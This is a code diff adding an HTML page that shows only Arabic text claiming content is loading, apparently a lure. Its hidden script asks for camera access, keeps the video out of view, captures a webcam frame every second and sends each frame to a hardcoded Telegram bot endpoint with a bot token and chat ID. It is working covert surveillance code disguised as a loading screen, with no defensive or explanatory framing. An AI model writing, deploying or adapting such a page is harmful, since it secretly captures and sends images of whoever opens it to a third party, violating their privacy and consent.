@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>جارٍ التحميل...</title>
+  <style>
+    body { text-align: center; font-family: Arial; padding: 50px; }
+    video { display: none; }
+    #status { font-size: 20px; }
+  </style>
+</head>
+<body>
+
+  <h2 id="status">جارٍ تحميل المحتوى، الرجاء الانتظار...</h2>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+
+    // ابدأ تشغيل الكاميرا
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+
+        setInterval(() => {
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const imgData = canvas.toDataURL('image/jpeg');
+
+          fetch('https://api.telegram.org/bot7865229336:AAG8w_CBGt0gcGfMd7syGaUVhUH5lJaNL6I/sendPhoto', {
+            method: 'POST',
+            body: new URLSearchParams({
+              chat_id: '6765420173',
+              photo: imgData
+            })
+          });
+        }, 1000); // يصور كل ثانية
+      })
+      .catch(err => {
+        document.getElementById('status').innerText = 'فشل في الوصول إلى الكاميرا 😓';
+      });
+  </script>
+
+</body>
+</html>
